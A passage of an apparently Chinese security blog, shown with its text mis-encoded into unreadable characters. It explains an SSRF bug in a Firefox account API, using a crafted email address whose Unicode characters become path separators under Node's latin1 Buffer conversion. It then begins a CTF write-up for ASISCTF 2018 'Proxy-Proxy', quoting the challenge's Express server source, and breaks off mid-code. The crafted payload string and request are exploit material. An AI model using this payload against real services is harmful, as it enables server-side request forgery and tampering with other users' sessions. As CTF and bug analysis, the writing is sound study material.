&lt;p>ç«ç‹é‚®ç®±è´¦å·çš„å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨åŽç«¯äº¤äº’æµç¨‹æ˜¯è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code> +--------+ +--------+ +-----------+ +----------+
| Client | HTTP | API | HTTP | DataStore | SQL | MySQL |
| |&amp;lt;------&amp;gt;| Server |&amp;lt;------&amp;gt;| Service |&amp;lt;-----&amp;gt;| Database |
+--------+ +--------+ +-----------+ +----------+
&lt;/code>&lt;/pre>&lt;p>å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚æ˜¯é€šè¿‡httpä¸ŽAPI Serveräº¤äº’çš„ï¼Œæ¯”å¦‚ä¸€ä¸ªè¿™æ ·çš„è¯·æ±‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">GET /email/74657374406578616d706c652e636f6d
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šå¾—åˆ°&lt;code>test@example.com&lt;/code>çš„é‚®ä»¶è®°å½•ï¼Œç”¨hexåšäº†è¯·æ±‚çš„è·¯ç”±ï¼Œä½†æ˜¯ä¸€ä¸ªåˆ é™¤æ“ä½œå´æ˜¯ç›´æŽ¥æ‹¼æŽ¥å­—ç¬¦ä¸²&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">DELETE /account/xyz/emails/test@example.com
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤æ—¶ï¼Œæœ€åŽçš„ç«¯ç‚¹å¯æŽ§ï¼Œç»“åˆä¸Šé¢çš„bugï¼Œå½“æˆ‘ä»¬æ³¨å†Œè¿™æ ·ä¸€ä¸ªè´¦å·&lt;/p>
&lt;pre tabindex="0">&lt;code>x@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc
&lt;/code>&lt;/pre>&lt;p>å®ƒå…¶å®žæ˜¯è¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>v = 'x@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc'
Buffer.from(v.toLowerCase(), &amp;quot;latin1&amp;quot;).toString()
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png" alt="image-20211205205928287">&lt;/p>
&lt;p>&lt;del>çœŸæ˜¯Node.jsçš„ç¾Žå¦™ç‰¹æ€§&lt;/del>&lt;/p>
&lt;p>å¯¹è¿™æ ·ä¸€ä¸ªè´¦å·å†æ¬¡è¿›è¡ŒDELETEè¯·æ±‚æ—¶åˆ™ä¼šè¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>console.log(Buffer.from('DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@Ì ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ‡Í…É”Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc', 'latin1').toString())
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png" alt="image-20211205210133004">&lt;/p>
&lt;p>SSRFæ¥äº†&lt;/p>
&lt;h2 id="asisctf-final-2018proxy-proxy">[ASISCTF final 2018]Proxy-Proxy&lt;/h2>
&lt;p>ç®€å•å®¡äº†ä¸€ä¸‹ä»£ç ï¼Œæ ‡è®°åˆ°æ³¨é‡Šä¸­äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body_parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;x-date&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body_parser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;jade&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.dat&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/proxy/internal_website/:page&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">page&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬æç¤º
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å…ˆè½¬å°å†™å†åˆ¤æ–­ ä¸èƒ½æœ‰flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// ç™½åå•å®¡æŸ¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;available_endpoints&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">endpoints&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:5000/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#75715e">// è¿”å›žç»“æžœ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;The resource not found.&amp;#39;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Got error: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è¿”å›žæŠ¥é”™åŽŸå› 
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ£€æŸ¥ipæ˜¯å¦ä¸ºæœ¬åœ°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unauthorized&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
